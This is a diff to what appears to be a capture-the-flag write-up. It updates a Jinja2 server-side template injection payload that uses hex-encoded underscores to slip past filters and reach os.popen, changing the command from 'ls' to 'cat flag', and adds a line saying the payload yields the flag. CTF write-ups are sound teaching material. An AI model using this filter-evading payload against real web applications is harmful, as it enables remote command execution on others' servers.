@@ -28,7 +28,11 @@ To bypass these restrictions in Jinja2, we use two techniques:
 # Exploit Payload
 After understanding the strategy, we will move on to the encoding Payload and we get this:
   
-{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')() }}
+{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')() }}
+after we do execute for payload 
+<img width="1599" height="776" alt="4" src="https://github.com/user-attachments/assets/ffe2e291-baaf-4e10-aeeb-f4e5a2cd39d7" />
+will get our flag.
+
 
 
 
